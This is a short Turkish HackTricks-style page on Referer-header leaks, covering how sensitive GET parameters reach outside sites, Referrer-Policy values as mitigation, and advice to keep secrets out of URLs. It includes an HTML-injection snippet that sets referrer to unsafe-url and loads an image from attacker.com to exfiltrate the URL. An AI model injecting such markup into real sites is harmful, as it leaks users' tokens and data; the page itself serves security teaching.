{{#include ./banners/hacktricks-training.md}}

# Referrer başlıkları ve politikası

Referrer, tarayıcılar tarafından önceki ziyaret edilen sayfayı belirtmek için kullanılan başlıktır.

## Hassas bilgilerin sızdırılması

Eğer bir web sayfasında herhangi bir noktada hassas bilgiler GET isteği parametrelerinde bulunuyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) öneride bulunabiliyorsa, en son GET isteğindeki hassas bilgileri dışarıya aktarabilir.

## Azaltma

Tarayıcının hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Referrer-policy** izlemesini sağlayabilirsiniz:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Karşı Önlem

Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu gerçekleştirmesi gerekir):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Savunma

Asla hassas verileri GET parametreleri veya URL'deki yolların içine koymayın.

{{#include ./banners/hacktricks-training.md}}
